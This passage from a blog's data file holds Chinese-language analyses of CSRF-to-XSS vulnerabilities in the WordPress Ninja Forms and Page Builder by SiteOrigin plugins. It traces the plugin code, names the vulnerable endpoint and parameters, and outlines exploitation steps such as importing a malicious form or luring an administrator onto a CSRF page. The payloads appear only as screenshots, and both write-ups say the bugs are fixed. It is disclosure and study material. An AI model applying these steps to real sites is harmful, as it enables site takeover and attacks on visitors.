alt=\"e20da3119ef76028fa3e3a37be0dbec5.png\"></p>\n<p>使用降级后，将删除目前安装的3.0版本的所有表单数据。因此该功能提示用户在使用该功能前导出表单数据。</p>\n<p>从后台代码来看，点击降级按钮后，程序启用位于deprecated路径的旧版ninja-forms入口文件</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154307-8cfe46f0-95b6-1.png\" alt=\"d9b252ead5e8ee9bde1d7a3cc239442a.png\"></p>\n<p>下图是位于deprecated路径的2.x版本ninja-forms入口文件</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154325-984122c6-95b6-1.png\" alt=\"6d196c85180ba59685631b8e1c9b7ffb.png\"></p>\n<p>作为降级功能的一部分，ninja-forms编写了NF_Upgrade.php文件，文件中AJAX函数旨在在使用“降级”模式时可以导入正常模式中导出的表单</p>\n<p>在了解了NF_Upgrade.php文件存在的意义之后，接下来分析下NF_Upgrade.php文件中存在漏洞的ninja_forms_ajax_import_form函数</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154351-a7cacbb6-95b6-1.png\" alt=\"eee6a010878b0661a9371499d0782159.png\"></p>\n<p>NF_Upgrade.php文件在25行处通过add_action注册了一个连接到ninja_forms_ajax_import_form函数的hook</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154405-afd8a26a-95b6-1.png\" alt=\"e442a1795467ef2a14b76cd3cc69b03a.png\"></p>\n<p>因此可以通过访问如下链接来触发ninja_forms_ajax_import_form函数</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154422-b9f45b22-95b6-1.png\" alt=\"5e84fa9fe6baff8d6ad03f9354b7b668.png\"></p>\n<p>在了解了ninja_forms_ajax_import_form函数如何通过请求调用后，继续分析该函数</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154435-c1ae859a-95b6-1.png\" alt=\"2e6cb612e6e60e233185af20d6a7eea7.png\"></p>\n<p>ninja_forms_ajax_import_form函数在27行处检验了用户权限</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154451-cb097988-95b6-1.png\" alt=\"2a7d0123d7ca43a51ab4868646bae619.png\"></p>\n<p>在29行处获取POST请求中import参数，在31行处获取POST请求中formID参数</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154508-d51adbc4-95b6-1.png\" alt=\"fbf1348147641834fdae1d09dbf3e71c.png\"></p>\n<p>程序在35行处将POST中提交的import参数与formID参数传入import_form函数中进行导入处理</p>\n<p>ninja_forms_ajax_import_form函数的作用，从对上文代码的理解，应该是用来给管理员提供导入表单功能用的。</p>\n<p>但是ninja_forms_ajax_import_form函数在安全上仅仅校验了使用者的权限，这点确实可以防止未授权访问的发生，但并未校验提交表单中的csrf token进行校验，并不能防范csrf漏洞，因此攻击者可以构造一个恶意页面链接诱骗管理员点击，从而向Ninja Forms插件提交一个导入恶意表单的请求。</p>\n<p>ninja_forms_ajax_import_form函数接收POST传入的两个参数：import参数与formID参数，import参数中的内容是导入表单的数据，formID参数值是对应的表单id。经过实际测试发现，如果formID参数设置为一个已经存在的表单，则导入的表单内容将会覆盖原有表单。</p>\n<p>在测试环境中有如下表单normal_form。攻击者可以通过查看使用该表单的页面源码来获得formID，这里normal_form的formID为2</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154531-e34f99f0-95b6-1.png\" alt=\"895d5b13349ae3e97defd1fac120bf3f.png\"></p>\n<p>normal_form是一个简单的单行文本表单</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154547-ecc580f8-95b6-1.png\" alt=\"b97353c9484d2aec2ec15f97e5abad36.png\"></p>\n<p>如果攻击者向在这个表单中插入一些恶意的js脚本，则可以在攻击时指定POST中formID为2</p>\n<p>要覆盖的目标有了，但是导入的数据信息到底怎么构造呢？</p>\n<p>回头看下ninja_forms_ajax_import_form函数</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154602-f5de68da-95b6-1.png\" alt=\"523972b734099bb08d2b20f34fc30993.png\"></p>\n<p>ninja_forms_ajax_import_form函数从POST请求中获取import参数，这个值就是导入模板的信息。接着程序将其传入import_form方法中进行导入处理。</p>\n<p>$_POST[‘import’]值应该是什么样子的呢？只有知道了这个值的格式，我们才好构造payload</p>\n<p>经过一番搜索，位于wp-content\\plugins\\ninja-forms\\ninja-forms.php文件中<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154616-fe19ec22-95b6-1.png\" alt=\"d639017a1f244b1fdcbafe541c18a57b.png\"></p>\n<p>我们可以看到如上的代码</p>\n<p>可见程序通过template方法读取位于wp-content\\plugins\\ninja-forms\\includes\\Templates\\<br>文件夹的formtemplate-contactform.nff文件内容，并传入import_form接口</p>\n<p>formtemplate-contactform.nff文件是这个样子的</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154631-0702b3e6-95b7-1.png\" alt=\"41e9ab63e926d69e4e8f68236a7b98ea.png\"></p>\n<p>到这里就很好办了，.nff文件正是ninja forms插件导出表单的默认格式。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154648-10f2fcb2-95b7-1.png\" alt=\"097b4271d4bcfb4c33ecec2af1560245.png\"></p>\n<p>因此利用思路比较清晰了</p>\n<ol>\n<li><p>攻击者在本地模仿目标表单模板构造一个含有恶意代码的表单模板</p>\n</li>\n<li><p>通过ninja forms插件将其导出为.nff文件</p>\n</li>\n<li><p>构造csrf页面，该页面会在管理员访问时发起csrf攻击，使用恶意的表单模板替换原有模板</p>\n</li>\n<li><p>诱使管理员访问</p>\n</li>\n<li><p>当用户与管理员使用这个恶意表单的页面时，xss将会被触发</p>\n</li>\n</ol>\n<p>现在已经理清利用思路，接下来构造一个恶意的.nff文件。模仿上文的normal_form表单，攻击者可以构造一个与之相似的恶意表单，与之不同的是，攻击者在描述处加入一行js脚本</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154709-1d908e8a-95b7-1.png\" alt=\"ccbffa34e0f175592e49ef057d5f24ff.png\"></p>\n<p>攻击者将这个恶意的表单模板导出</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154727-284e1536-95b7-1.png\" alt=\"097b4271d4bcfb4c33ecec2af1560245.png\"></p>\n<p>导出的恶意表单部分内容如下</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154740-2ff963f8-95b7-1.png\" alt=\"224d79451025a8c36178bfab115c3771.png\"></p>\n<p>攻击者构造一个表单提交页面，表单提交的地址为<a href=\"http://x.x.x.x/wordpress/wp-admin/admin-ajax.php?action=ninja_forms_ajax_import_form\">http://x.x.x.x/wordpress/wp-admin/admin-ajax.php?action=ninja_forms_ajax_import_form</a><br>提交内容中import值为恶意文件内容、formID值为要覆盖的原normal_form的id，并诱使管理员点击页面链接</p>\n<p>当攻击成功后，normal_form表单将会被恶意的表单覆盖</p>\n<p>当用户使用该表单进行提交时</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154755-38ee6cce-95b7-1.png\" alt=\"cc91b4c75a04cdc63ff81dde5779063a.png\"></p>\n<p>点击submit时xss被触发</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154809-4125abaa-95b7-1.png\" alt=\"31b46fa45c241f800c81f746e79589da.png\"></p>\n<p>不仅如此，当管理员在后台管理编辑该表单时，当进入编辑页面，xss仍然可以被触发</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154824-49ffe736-95b7-1.png\" alt=\"b6ae533afbf1b1f01c602420752d7ca2.png\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>该漏洞在3.4.24.2版中完全修复。在分析这个漏洞的过程中，发现ninja_forms插件非常的好用，推荐有需要的朋友可以试用下。</p>\n"},{"title":"WordPress Page Buider插件 CSRF to XSS漏洞分析","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/hacker-0509-scaled.jpg","date":"2020-06-01T09:26:05.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n前言\n----\n\nPage Builder by SiteOrigin是一个安装量超过100W的WordPress页面生成器插件，该插件可帮助用户使用基于小工具的页面生成器轻松构建响应式页面内容\n\n![5602057ec16c195db947deaeadf92a3f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131117-5606d4ae-9a58-1.png)\n\n近日wordfence安全人员披露了一个Page Builder by SiteOrigin2.10.15及以下版本中发现的严重安全漏洞：\nCSRF to XSS。攻击者可以通过诱使WordPress站点管理员单击特制链接以触发该漏洞，成功利用该漏洞可以使攻击者创建一个新的管理员帐户并安装后门程序。\n\n漏洞分析\n--------\n\nPage Builder bySiteOrigin插件内置一款实时编辑器，用户可以在观察实时更改的同时更新内容，这使得页面的编辑和设计或发布过程更加流畅。\n\n![73dd0001f9a40c0dd939302755b258dc.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131144-660a7004-9a58-1.png)\n\n本次漏洞就是出现在该插件内置的实时编辑器中。\n\n在编辑文章活页面时点击实时编辑器按钮即可使用此工具\n\n![7351e25c7ebb5d4f207dbaaeade362ad.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131344-ad93a0e4-9a58-1.png)\n\n在实时编辑器中可以实时预览编辑文章、添加小工具、修改页面布局等情况\n\n![a213103a3a6cb4172e532d67f67f3c2a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131413-be9f0ed2-9a58-1.png)\n\n以添加小工具功能为例，我们可以添加一个自定义HTML模块\n\n![1c1a291adb947263670f8a86947ca3ad.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131535-efae288c-9a58-1.png)\n\n在这个模块中添加一些内容\n\n![472cbcf202a29d59843f46bb489665de.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131556-fc065b2c-9a58-1.png)\n\n完成编辑后，用户的编辑效果可以实时呈现在编辑器浏览页面中\n\n![990a7ad9885c8880cc91cfc27f7fad2f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131613-0619741e-9a59-1.png)\n\n实时编辑器仅提供用户对草稿的编辑与预览。如果需要保存与发布，还需要点击Save Draft按钮\n\n在了解了Page Builder by SiteOrigin插件的功能之后，再看一下后台是如何实现与如何产生漏洞的\n\n当用户点击实时编辑器按钮后，会进入上文描述的实时编辑器页面\n\n此时用户可以对页面进行一些编辑操作，当用户编辑完成后点击已完成按钮后，会向后台发送如下请求：\n\n![82bbe64a16e3ee32ecf978ee845b7167.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131629-0f91a3e0-9a59-1.png)\n\nurl中p参数代表目前编辑的文章id，siteorigin_panels_live_editor=true代表目前正开启使用实时编辑器，live_editor_panels_data参数值为修改后的页面数据\n\n可以跟进插件后台看一下代码\n\n![68e36c1e7f20d7bae9cf09087a174f8a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131642-1776070e-9a59-1.png)\n\n程序通过is_live_editor来判断是否使用实时编辑器\n\n我们接下来看一下is_live_editor函数\n\n![0b4b5b8be223fa7cb5bf47ea4b2b577c.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131656-1f928516-9a59-1.png)\n\nis_live_editor函数的作用是检查用户是否在前端的实时编辑器中，当用户提交的请求url中siteorigin_panels_live_editor不为空时，则判断用户正在使用实时编辑器\n\n接着，程序调用SiteOrigin_Panels_Live_Editor::single()函数包含实时编辑器文件\n\n![7dd3f387c593c990ece8059b4464ba0c.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131710-2815bdde-9a59-1.png)\n\n![eb39bfca06d4eae5db39268f5d09d644.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131728-32e65930-9a59-1.png)\n\n在SiteOrigin_Panels_Live_Editor类的构造方法中，通过add_action函数将post_metadata函数挂载到get_post_metadata hook上\n\n![bf43da4c2fa9dfad1d0dfb1bd9663950.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131746-3dd956b2-9a59-1.png)\n\nget_{\\$meta_type}_metadata hook用以处理动态部分\\$meta_type指定的元数据类型并获取元数据，这里是用来获取挂载的post_metadata函数返回的元数据\n\n接下来看一下post_metadata函数\n\n![f028fa52603ac0e7de9b9c573a374e80.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131804-48a1cda4-9a59-1.png)\n\n在post_metadata函数中，对访问实时编辑器的用户身份、提交的跟新信息等进行校验，通过校验的数据可以进行后续处理并返回元数据。但post_metadata函数并没有通过校验csrf token来保护提交数据的来源合法性。这将导致csrf漏洞的产生。\n\n在通过一系列的校验后，程序将live_editor_panels_data参数提交的页面信息进行加工并进行渲染工作。程序使用add_filter('the_content', string \\$content )实现页面内容加工工作,然后再将其打印到屏幕上\n\n![e27d11a730e2ba6beb5a6d4e6c019ca1.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131819-518c34cc-9a59-1.png)\n\n这里用来加工页面信息的函数是generate_post_content\n\n![a771f883323d14de0ef0cd34ce838962.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131833-59c25ae0-9a59-1.png)\n\n最终，live_editor_panels_data参数中提交的新的页面信息将会被打印到屏幕上\n\n需要特别注意的是，此插件实施编辑器中有如下代码\n\n![d1d8a87cd2a479746720dd5e8a9cd597.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131846-6194c69a-9a59-1.png)\n\n![7cf98e32bee7a7eb769f09b247cda67c.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131858-686a9242-9a59-1.png)\n\n实时编辑器通过header( 'X-XSS-Protection: 0');设置X-XSS-Protection响应头以关闭浏览器XSS保护。可见这个插件的实时编辑器页面中允许xss的触发。\n\n漏洞利用\n--------\n\n构造实时编辑提交页面修改的数据包\n\n![601baa1f13ba0af8c8d6e4426c7eac3e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131914-722ee72e-9a59-1.png)\n\n将其中的content字段改为xss payload\n\n![e26acd21aa9b11b8a28a89d88f86c14b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131929-7afc2a56-9a59-1.png)\n\n生成csrf poc\n\n![857c91104eb61fd5b71f62db54854b97.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131943-831cce3e-9a59-1.png)\n\n当管理员访问该poc页面时，xss触发\n\n![cef52538169f1a0787b579875c258868.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131957-8bcf5f60-9a59-1.png)\n\n通过xss漏洞，可以构造payload进行进一步的攻击，例如添加一个管理员账号。\n\n修复\n----\n\n在新版live-editor.php文件的xss_headers函数中加入了wp_verify_nonce()函数对nonce进行校验\n\n![697a9fe96436a57113323029bc56a45e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520132010-939c214c-9a59-1.png)\n\n这一措施可以有效的防范csrf漏洞的产生","source":"_posts/WordPress-Page-Buider.md","raw":"---\ntitle: WordPress Page Buider插件 CSRF to XSS漏洞分析\ntags: web漏洞分析\ncategories: 技术\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/hacker-0509-scaled.jpg\ndate: 2020-06-01 17:26:05\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n前言\n----\n\nPage Builder by SiteOrigin是一个安装量超过100W的WordPress页面生成器插件，该插件可帮助用户使用基于小工具的页面生成器轻松构建响应式页面内容\n\n![5602057ec16c195db947deaeadf92a3f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131117-5606d4ae-9a58-1.png)\n\n近日wordfence安全人员披露了一个Page Builder by SiteOrigin2.10.15及以下版本中发现的严重安全漏洞：\nCSRF to XSS。攻击者可以通过诱使WordPress站点管理员单击特制链接以触发该漏洞，成功利用该漏洞可以使攻击者创建一个新的管理员帐户并安装后门程序。\n\n漏洞分析\n--------\n\nPage Builder bySiteOrigin插件内置一款实时编辑器，用户可以在观察实时更改的同时更新内容，这使得页面的编辑和设计或发布过程更加流畅。\n\n![73dd0001f9a40c0dd939302755b258dc.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131144-660a7004-9a58-1.png)\n\n本次漏洞就是出现在该插件内置的实时编辑器中。\n\n在编辑文章活页面时点击实时编辑器按钮即可使用此工具\n\n![7351e25c7ebb5d4f207dbaaeade362ad.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131344-ad93a0e4-9a58-1.png)\n\n在实时编辑器中可以实时预览编辑文章、添加小工具、修改页面布局等情况\n\n![a213103a3a6cb4172e532d67f67f3c2a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131413-be9f0ed2-9a58-1.png)\n\n以添加小工具功能为例，我们可以添加一个自定义HTML模块\n\n![1c1a291adb947263670f8a86947ca3ad.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131535-efae288c-9a58-1.png)\n\n在这个模块中添加一些内容\n\n![472cbcf202a29d59843f46bb489665de.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131556-fc065b2c-9a58-1.png)\n\n完成编辑后，用户的编辑效果可以实时呈现在编辑器浏览页面中\n\n![990a7ad9885c8880cc91cfc27f7fad2f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131613-0619741e-9a59-1.png)\n\n实时编辑器仅提供用户对草稿的编辑与预览。如果需要保存与发布，还需要点击Save Draft按钮\n\n在了解了Page Builder by SiteOrigin插件的功能之后，再看一下后台是如何实现与如何产生漏洞的\n\n当用户点击实时编辑器按钮后，会进入上文描述的实时编辑器页面\n\n此时用户可以对页面进行一些编辑操作，当用户编辑完成后点击已完成按钮后，会向后台发送如下请求：\n\n![82bbe64a16e3ee32ecf978ee845b7167.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131629-0f91a3e0-9a59-1.png)\n\nurl中p参数代表目前编辑的文章id，siteorigin_panels_live_editor=true代表目前正开启使用实时编辑器，live_editor_panels_data参数值为修改后的页面数据\n\n可以跟进插件后台看一下代码\n\n![68e36c1e7f20d7bae9cf09087a174f8a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131642-1776070e-9a59-1.png)\n\n程序通过is_live_editor来判断是否使用实时编辑器\n\n我们接下来看一下is_live_editor函数\n\n![0b4b5b8be223fa7cb5bf47ea4b2b577c.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131656-1f928516-9a59-1.png)\n\nis_live_editor函数的作用是检查用户是否在前端的实时编辑器中，当用户提交的请求url中siteorigin_panels_live_editor不为空时，则判断用户正在使用实时编辑器\n\n接着，程序调用SiteOrigin_Panels_Live_Editor::single()函数包含实时编辑器文件\n\n![7dd3f387c593c990ece8059b4464ba0c.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131710-2815bdde-9a59-1.png)\n\n![eb39bfca06d4eae5db39268f5d09d644.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131728-32e65930-9a59-1.png)\n\n在SiteOrigin_Panels_Live_Editor类的构造方法中，通过add_action函数将post_metadata函数挂载到get_post_metadata hook上\n\n![bf43da4c2fa9dfad1d0dfb1bd9663950.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131746-3dd956b2-9a59-1.png)\n\nget_{\\$meta_type}_metadata hook用以处理动态部分\\$meta_type指定的元数据类型并获取元数据，这里是用来获取挂载的post_metadata函数返回的元数据\n\n接下来看一下post_metadata函数\n\n![f028fa52603ac0e7de9b9c573a374e80.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131804-48a1cda4-9a59-1.png)\n\n在post_metadata函数中，对访问实时编辑器的用户身份、提交的跟新信息等进行校验，通过校验的数据可以进行后续处理并返回元数据。但post_metadata函数并没有通过校验csrf token来保护提交数据的来源合法性。这将导致csrf漏洞的产生。\n\n在通过一系列的校验后，程序将live_editor_panels_data参数提交的页面信息进行加工并进行渲染工作。程序使用add_filter('the_content', string \\$content )实现页面内容加工工作,然后再将其打印到屏幕上\n\n![e27d11a730e2ba6beb5a6d4e6c019ca1.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131819-518c34cc-9a59-1.png)\n\n这里用来加工页面信息的函数是generate_post_content\n\n![a771f883323d14de0ef0cd34ce838962.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131833-59c25ae0-9a59-1.png)\n\n最终，live_editor_panels_data参数中提交的新的页面信息将会被打印到屏幕上\n\n需要特别注意的是，此插件实施编辑器中有如下代码\n\n![d1d8a87cd2a479746720dd5e8a9cd597.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131846-6194c69a-9a59-1.png)\n\n![7cf98e32bee7a7eb769f09b247cda67c.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131858-686a9242-9a59-1.png)\n\n实时编辑器通过header( 'X-XSS-Protection: 0');设置X-XSS-Protection响应头以关闭浏览器XSS保护。可见这个插件的实时编辑器页面中允许xss的触发。\n\n漏洞利用\n--------\n\n构造实时编辑提交页面修改的数据包\n\n![601baa1f13ba0af8c8d6e4426c7eac3e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131914-722ee72e-9a59-1.png)\n\n将其中的content字段改为xss payload\n\n![e26acd21aa9b11b8a28a89d88f86c14b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131929-7afc2a56-9a59-1.png)\n\n生成csrf poc\n\n![857c91104eb61fd5b71f62db54854b97.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131943-831cce3e-9a59-1.png)\n\n当管理员访问该poc页面时，xss触发\n\n![cef52538169f1a0787b579875c258868.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520131957-8bcf5f60-9a59-1.png)\n\n通过xss漏洞，可以构造payload进行进一步的攻击，例如添加一个管理员账号。\n\n修复\n----\n\n在新版live-editor.php文件的xss_headers函数中加入了wp_verify_nonce()函数对nonce进行校验\n\n![697a9fe96436a57113323029bc56a45e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200520132010-939c214c-9a59-1.png)\n\n这一措施可以有效的防范csrf漏洞的产生","slug":"WordPress-Page-Buider","published":1,"updated":"2020-10-28T01:00:45.454Z","_id":"ckgrozu8w0023wsa9gsfl9ilu","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>Page Builder by SiteOrigin是一个安装量超过100W的WordPress页面生成器插件，该插件可帮助用户使用基于小工具的页面生成器轻松构建响应式页面内容</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131117-5606d4ae-9a58-1.png\" alt=\"5602057ec16c195db947deaeadf92a3f.png\"></p>\n<p>近日wordfence安全人员披露了一个Page Builder by SiteOrigin2.10.15及以下版本中发现的严重安全漏洞：<br>CSRF to XSS。攻击者可以通过诱使WordPress站点管理员单击特制链接以触发该漏洞，成功利用该漏洞可以使攻击者创建一个新的管理员帐户并安装后门程序。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>Page Builder bySiteOrigin插件内置一款实时编辑器，用户可以在观察实时更改的同时更新内容，这使得页面的编辑和设计或发布过程更加流畅。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131144-660a7004-9a58-1.png\" alt=\"73dd0001f9a40c0dd939302755b258dc.png\"></p>\n<p>本次漏洞就是出现在该插件内置的实时编辑器中。</p>\n<p>在编辑文章活页面时点击实时编辑器按钮即可使用此工具</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131344-ad93a0e4-9a58-1.png\" alt=\"7351e25c7ebb5d4f207dbaaeade362ad.png\"></p>\n<p>在实时编辑器中可以实时预览编辑文章、添加小工具、修改页面布局等情况</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131413-be9f0ed2-9a58-1.png\" alt=\"a213103a3a6cb4172e532d67f67f3c2a.png\"></p>\n<p>以添加小工具功能为例，我们可以添加一个自定义HTML模块</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131535-efae288c-9a58-1.png\" alt=\"1c1a291adb947263670f8a86947ca3ad.png\"></p>\n<p>在这个模块中添加一些内容</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131556-fc065b2c-9a58-1.png\" alt=\"472cbcf202a29d59843f46bb489665de.png\"></p>\n<p>完成编辑后，用户的编辑效果可以实时呈现在编辑器浏览页面中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131613-0619741e-9a59-1.png\" alt=\"990a7ad9885c8880cc91cfc27f7fad2f.png\"></p>\n<p>实时编辑器仅提供用户对草稿的编辑与预览。如果需要保存与发布，还需要点击Save Draft按钮</p>\n<p>在了解了Page Builder by SiteOrigin插件的功能之后，再看一下后台是如何实现与如何产生漏洞的</p>\n<p>当用户点击实时编辑器按钮后，会进入上文描述的实时编辑器页面</p>\n<p>此时用户可以对页面进行一些编辑操作，当用户编辑完成后点击已完成按钮后，会向后台发送如下请求：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131629-0f91a3e0-9a59-1.png\" alt=\"82bbe64a16e3ee32ecf978ee845b7167.png\"></p>\n<p>url中p参数代表目前编辑的文章id，siteorigin_panels_live_editor=true代表目前正开启使用实时编辑器，live_editor_panels_data参数值为修改后的页面数据</p>\n<p>可以跟进插件后台看一下代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131642-1776070e-9a59-1.png\" alt=\"68e36c1e7f20d7bae9cf09087a174f8a.png\"></p>\n<p>程序通过is_live_editor来判断是否使用实时编辑器</p>\n<p>我们接下来看一下is_live_editor函数</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131656-1f928516-9a59-1.png\" alt=\"0b4b5b8be223fa7cb5bf47ea4b2b577c.png\"></p>\n<p>is_live_editor函数的作用是检查用户是否在前端的实时编辑器中，当用户提交的请求url中siteorigin_panels_live_editor不为空时，则判断用户正在使用实时编辑器</p>\n<p>接着，程序调用SiteOrigin_Panels_Live_Editor::single()函数包含实时编辑器文件</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131710-2815bdde-9a59-1.png\" alt=\"7dd3f387c593c990ece8059b4464ba0c.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131728-32e65930-9a59-1.png\" alt=\"eb39bfca06d4eae5db39268f5d09d644.png\"></p>\n<p>在SiteOrigin_Panels_Live_Editor类的构造方法中，通过add_action函数将post_metadata函数挂载到get_post_metadata hook上</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131746-3dd956b2-9a59-1.png\" alt=\"bf43da4c2fa9dfad1d0dfb1bd9663950.png\"></p>\n<p>get_{$meta_type}_metadata hook用以处理动态部分$meta_type指定的元数据类型并获取元数据，这里是用来获取挂载的post_metadata函数返回的元数据</p>\n<p>接下来看一下post_metadata函数</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131804-48a1cda4-9a59-1.png\" alt=\"f028fa52603ac0e7de9b9c573a374e80.png\"></p>\n<p>在post_metadata函数中，对访问实时编辑器的用户身份、提交的跟新信息等进行校验，通过校验的数据可以进行后续处理并返回元数据。但post_metadata函数并没有通过校验csrf token来保护提交数据的来源合法性。这将导致csrf漏洞的产生。</p>\n<p>在通过一系列的校验后，程序将live_editor_panels_data参数提交的页面信息进行加工并进行渲染工作。程序使用add_filter(‘the_content’, string $content )实现页面内容加工工作,然后再将其打印到屏幕上</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131819-518c34cc-9a59-1.png\" alt=\"e27d11a730e2ba6beb5a6d4e6c019ca1.png\"></p>\n<p>这里用来加工页面信息的函数是generate_post_content</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131833-59c25ae0-9a59-1.png\" alt=\"a771f883323d14de0ef0cd34ce838962.png\"></p>\n<p>最终，live_editor_panels_data参数中提交的新的页面信息将会被打印到屏幕上</p>\n<p>需要特别注意的是，此插件实施编辑器中有如下代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131846-6194c69a-9a59-1.png\" alt=\"d1d8a87cd2a479746720dd5e8a9cd597.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200520131858-686a9242-9a59-1.png\" alt=\"7cf98e32bee7a7eb769f09b247cda67c.png\"></p>\n<p>实时编辑器通过header( ‘X-XSS-Protection: 0’);设置X-XSS-Protection响应头以关闭浏览器XSS保护。可见这个插件的实时编辑器页面中允许xss的触发。</p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>构造实时编辑提交页面修改的数据包</p>\n<p><img src= \"/img/loading.gif\" 